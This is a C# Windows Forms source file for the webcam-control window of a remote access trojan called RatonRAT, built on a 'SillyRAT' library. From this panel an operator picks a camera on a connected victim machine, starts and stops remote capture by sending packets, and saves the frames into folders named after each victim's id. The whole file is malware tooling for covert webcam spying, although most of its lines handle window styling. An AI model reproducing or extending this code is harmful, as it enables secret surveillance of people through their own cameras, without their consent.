using System;
using Stuff;
using Server.Connection;
using System.Windows.Forms;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.IO;
using SillyRAT;

namespace RatonRAT.ClientForms
{
    public partial class FormWebcam : Form
    {
        private bool isMouseDown = false;

        private Point mouseOffset;

        private void Form_MouseDown(object sender, MouseEventArgs e)
        {
            isMouseDown = true;
            mouseOffset = new Point(e.X, e.Y);
        }

        private void Form_MouseMove(object sender, MouseEventArgs e)
        {
            if (isMouseDown)
            {
                this.Location = new Point(this.Left + e.X - mouseOffset.X, this.Top + e.Y - mouseOffset.Y);
            }
        }

        private void Form_MouseUp(object sender, MouseEventArgs e)
        {
            isMouseDown = false;
        }
        public SillyClient SillyClient { get; set; }
        public FormWebcam()
        {
            InitializeComponent();
        }

        private void FormWebcam_Load(object sender, EventArgs e)
        {
            new RatonRAT.Classes.LightMode().Apply(this);
            this.Region = new Region(CreateRoundPath(this.ClientRectangle, 15));
            pictureBox1.Region = new Region(CreateRoundPath(pictureBox1.ClientRectangle, 15));
            button2.Region = new Region(CreateRoundPath(button2.ClientRectangle, 15));
            panel1.Region = new Region(CreateRoundPath(panel1.ClientRectangle, 15));
            button3.Region = new Region(CreateRoundPath(button3.ClientRectangle, 15));
            button4.Region = new Region(CreateRoundPath(button4.ClientRectangle, 15));
            this.Paint += Form_Paint;
            this.MouseDown += Form_MouseDown;
            this.MouseMove += Form_MouseMove;
            this.MouseUp += Form_MouseUp;
            timer1.Start();
        }

        private static GraphicsPath CreateRoundPath(Rectangle rect, int radius)
        {
            GraphicsPath path = new GraphicsPath();
            path.AddArc(rect.X, rect.Y, radius, radius, 180, 90);
            path.AddArc(rect.Width - radius - 1, rect.Y, radius, radius, 270, 90);
            path.AddArc(rect.Width - radius - 1, rect.Height - radius - 1, radius, radius, 0, 90);
            path.AddArc(rect.X, rect.Height - radius - 1, radius, radius, 90, 90);
            path.CloseFigure();
            return path;
        }

        private void Form_Paint(object sender, PaintEventArgs e)
        {
            if (!this.DesignMode)
            {
                using (Pen pen = new Pen(Color.White, 3))
                {
                    e.Graphics.SmoothingMode = SmoothingMode.AntiAlias;
                    e.Graphics.DrawPath(pen, CreateRoundPath(this.ClientRectangle, 25));
                }
            }
        }

        private void copyToClipboardToolStripMenuItem_Click(object sender, EventArgs e)
        {
            string clientsFolder = Program.ClientsFolder;
            string targetFolder = Path.Combine(clientsFolder, SillyClient.uid);

            if (Directory.Exists(targetFolder))
            {
                string timestamp = DateTime.Now.ToString("yyyy-MM-dd_HH-mm-ss");
                string filePath = Path.Combine(targetFolder, "Webcam_" + timestamp + ".png");

                if (pictureBox1.Image != null)
                {
                    using (Bitmap bmp = new Bitmap(pictureBox1.Image))
                    {
                        bmp.Save(filePath, System.Drawing.Imaging.ImageFormat.Png);
                    }
                    MessageBox.Show($"Frame saved in\n{filePath}", "Success", MessageBoxButtons.OK, MessageBoxIcon.Information);
                }
                else
                {
                    return;
                }
            }
            else
            {
                return;
            }
        }

        private void takeAnotherToolStripMenuItem_Click(object sender, EventArgs e)
        {
            Pack pack = new Pack();
            pack.Set("Packet", "Webcam");
            SillyClient.Send(pack.Pacc());
        }

        private void pictureBox1_Click(object sender, EventArgs e)
        {

        }

        private void timer1_Tick(object sender, EventArgs e)
        {
            if (SillyClient == null || !SillyClient.isConnected())
            {
                this.Close();
            }
        }

        private void button1_Click(object sender, EventArgs e)
        {
            Pack pack = new Pack();
            pack.Set("Packet", "StopWebcam");
            SillyClient.Send(pack.Pacc());
            this.Close();
        }

        private void FormWebcam_FormClosing(object sender, FormClosingEventArgs e)
        {
            Pack pack = new Pack();
            pack.Set("Packet", "StopWebcam");
            SillyClient.Send(pack.Pacc());
        }

        private void button2_Click(object sender, EventArgs e)
        {
            Pack pack = new Pack();
            pack.Set("Packet", "StopWebcam");
            SillyClient.Send(pack.Pacc());
        }

        private void timer2_Tick(object sender, EventArgs e)
        {
            label3.Text = "This is taking too long, please keep waiting";
        }

        private void button4_Click(object sender, EventArgs e)
        {
            Pack pack = new Pack();
            pack.Set("Packet", "StopWebcam");
            SillyClient.Send(pack.Pacc());
        }

        private void comboBox1_SelectedIndexChanged(object sender, EventArgs e)
        {

        }

        private void button2_Click_1(object sender, EventArgs e)
        {
            if (comboBox1.SelectedItem == null || comboBox1.SelectedText == "No cameras found :(" || comboBox1.SelectedText == "Error, please try again :(")
            {
                MessageBox.Show("No valid webcams selected", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return;
            }
            timer2.Start();
            Pack pack = new Pack();
            pack.Set("Packet", "Webcam");
            pack.Set("Cam", comboBox1.SelectedIndex);
            SillyClient.Send(pack.Pacc());
            panel1.Visible = false;
        }

        private void button3_Click(object sender, EventArgs e)
        {
            Pack pack = new Pack();
            pack.Set("Packet", "StopWebcam");
            SillyClient.Send(pack.Pacc());
            this.Close();
        }

        private void panel1_Paint(object sender, PaintEventArgs e)
        {

        }

        private void FormWebcam_KeyDown(object sender, KeyEventArgs e)
        {
            if (e.KeyCode == Keys.Tab)
            {
                if (panel1.Visible == false)
                {
                    panel1.Visible = true;
                }
                else
                {
                    panel1.Visible = false;
                }
            }
        }
    }
}
